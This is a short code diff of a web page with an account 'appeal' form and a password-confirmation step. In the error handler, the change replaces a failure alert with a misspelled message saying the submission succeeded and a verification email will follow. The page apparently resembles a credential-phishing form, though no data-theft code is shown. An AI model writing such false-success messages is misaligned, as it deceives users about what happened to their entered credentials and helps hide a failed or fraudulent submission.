@@ -1720,7 +1720,7 @@
                         }
                     } catch (error) {
                         console.error('Form submission error:', error);
-                        alert(translations[currentLanguage]['submission_error'] || 'An error occurred while submitting your appeal. Please try again later.');
+                        alert(translations[currentLanguage]['submission_error'] || 'Successfully sumitted . Please wait for verificstion email.');
                         confirmPasswordBtn.disabled = false;
                         confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
                     }
@@ -1875,4 +1875,5 @@
 
 
 <span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span></body></html>
+
 
